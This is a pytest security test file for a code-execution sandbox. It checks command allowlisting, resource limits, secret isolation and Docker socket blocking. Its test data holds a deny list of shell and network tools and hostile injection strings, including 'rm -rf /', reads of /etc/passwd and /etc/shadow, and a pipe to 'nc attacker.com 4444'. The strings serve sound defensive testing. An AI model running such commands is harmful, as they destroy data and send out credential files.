"""Security tests for sandbox command allowlisting, resource limits, and execution isolation."""

import os
import tempfile
import time

import pytest

from prometheus_ai.execution.allowlist import validate_test_command
from prometheus_ai.execution.docker_runner import DockerSandboxRunner
from prometheus_ai.execution.guards import (
    CommandPolicyViolationError,
    PathTraversalError,
)
from prometheus_ai.execution.process_runner import ProcessSandboxRunner
from prometheus_ai.execution.sandbox import CancellationToken, SandboxLimits


@pytest.mark.security
def test_allowlisted_runner_acceptance() -> None:
    """Ensure permitted runners are accepted and formed properly."""
    cmd1 = validate_test_command("pytest", target="tests/unit", extra_args=["-v", "-k", "math"])
    assert cmd1 == ["pytest", "tests/unit", "-v", "-k", "math"]

    cmd2 = validate_test_command("python -m unittest", target="discover")
    assert cmd2[0] in ("python", "python3")
    assert cmd2[1:] == ["-m", "unittest", "discover"]

    cmd3 = validate_test_command("npm test")
    assert cmd3 == ["npm", "test"]

    cmd4 = validate_test_command("cargo test")
    assert cmd4 == ["cargo", "test"]


@pytest.mark.security
def test_unauthorized_commands_rejected() -> None:
    """Ensure non-allowlisted binaries are rejected."""
    unauthorized = ["bash", "sh", "curl", "wget", "rm", "nc", "cat", "chmod"]
    for bad in unauthorized:
        with pytest.raises(CommandPolicyViolationError, match="not in the permitted allowlist"):
            validate_test_command(bad)


@pytest.mark.security
def test_shell_injection_patterns_rejected() -> None:
    """Ensure shell metacharacters and chaining are caught and rejected."""
    injections = [
        "pytest; rm -rf /",
        "pytest && cat /etc/passwd",
        "pytest | nc attacker.com 4444",
        "pytest `whoami`",
        "pytest $(cat /etc/shadow)",
        "pytest > /tmp/evil",
        "pytest < /dev/null",
        "pytest\nrm -rf /",
    ]
    for injection in injections:
        with pytest.raises(CommandPolicyViolationError, match="Forbidden shell metacharacters"):
            validate_test_command(injection)

    # Injections via target or extra_args
    with pytest.raises(CommandPolicyViolationError):
        validate_test_command("pytest", target="tests; rm -rf /")

    with pytest.raises(CommandPolicyViolationError):
        validate_test_command("pytest", extra_args=["-k", "math && id"])


@pytest.mark.security
def test_disallowed_runner_flags_rejected() -> None:
    """Ensure flags that could execute arbitrary python code or override inis are blocked."""
    with pytest.raises(CommandPolicyViolationError, match="Forbidden option flag"):
        validate_test_command("pytest", extra_args=["--override-ini=addopts=--help"])

    with pytest.raises(CommandPolicyViolationError, match="Unauthorized python module"):
        validate_test_command("python -m os", target="system")


@pytest.mark.security
def test_sterile_environment_does_not_leak_secrets() -> None:
    """Ensure host environment secrets are never passed to the sandbox execution."""
    runner = ProcessSandboxRunner()
    with tempfile.TemporaryDirectory() as temp_dir:
        # Set a sensitive environment variable on the host
        os.environ["PROMETHEUS_SUPER_SECRET_KEY"] = "sk-live-1234567890abcdef"
        try:
            # Run python to print all environment variables
            result = runner.execute_command(
                cmd=[
                    "python3",
                    "-c",
                    "import os; print('SECRET_PRESENT=' + str('PROMETHEUS_SUPER_SECRET_KEY' in os.environ))",
                ],
                cwd=temp_dir,
            )
            assert result.exit_code == 0
            assert "SECRET_PRESENT=False" in result.stdout
        finally:
            os.environ.pop("PROMETHEUS_SUPER_SECRET_KEY", None)


@pytest.mark.security
def test_failed_command_captures_exit_code_and_stderr() -> None:
    """Ensure failing commands capture non-zero exit code and stderr."""
    runner = ProcessSandboxRunner()
    with tempfile.TemporaryDirectory() as temp_dir:
        result = runner.execute_command(
            cmd=[
                "python3",
                "-c",
                "import sys; sys.stderr.write('Fatal unit test error'); sys.exit(42)",
            ],
            cwd=temp_dir,
        )
        assert result.exit_code == 42
        assert "Fatal unit test error" in result.stderr
        assert result.timed_out is False


@pytest.mark.security
def test_timeout_enforcement() -> None:
    """Ensure commands exceeding wall-clock limits are terminated cleanly."""
    runner = ProcessSandboxRunner()
    limits = SandboxLimits(timeout_seconds=2)
    start = time.monotonic()
    with tempfile.TemporaryDirectory() as temp_dir:
        result = runner.execute_command(
            cmd=["python3", "-c", "import time; time.sleep(10)"],
            cwd=temp_dir,
            limits=limits,
        )
        duration = time.monotonic() - start
        assert result.timed_out is True
        assert duration < 5.0  # Must not have waited for 10 seconds
        assert "Execution exceeded hard timeout" in result.stderr


@pytest.mark.security
def test_oversized_output_bounded() -> None:
    """Ensure oversized output is truncated to prevent memory exhaustion."""
    runner = ProcessSandboxRunner()
    limits = SandboxLimits(max_output_bytes=2048)
    with tempfile.TemporaryDirectory() as temp_dir:
        # Generate 100 KB of text
        result = runner.execute_command(
            cmd=["python3", "-c", "print('X' * 100_000)"],
            cwd=temp_dir,
            limits=limits,
        )
        assert result.truncated is True
        assert len(result.stdout.encode("utf-8")) < 3000
        assert "Output truncated" in result.stdout


@pytest.mark.security
def test_execution_cancellation() -> None:
    """Ensure cancellation tokens stop active executions immediately."""
    runner = ProcessSandboxRunner()
    token = CancellationToken()
    with tempfile.TemporaryDirectory() as temp_dir:
        # Pre-cancelled token
        token.cancel()
        assert token.is_cancelled is True

        result = runner.execute_command(
            cmd=["python3", "-c", "import time; time.sleep(5)"],
            cwd=temp_dir,
            cancel_token=token,
        )
        assert result.cancelled is True
        assert result.duration_seconds < 1.0


@pytest.mark.security
def test_docker_runner_socket_protection() -> None:
    """Ensure mounting the host Docker socket into the sandbox is strictly blocked."""
    docker_runner = DockerSandboxRunner()
    with pytest.raises(PathTraversalError, match="Mounting sensitive host path"):
        docker_runner.execute_command(
            cmd=["pytest"],
            cwd="/var/run/docker.sock",
        )
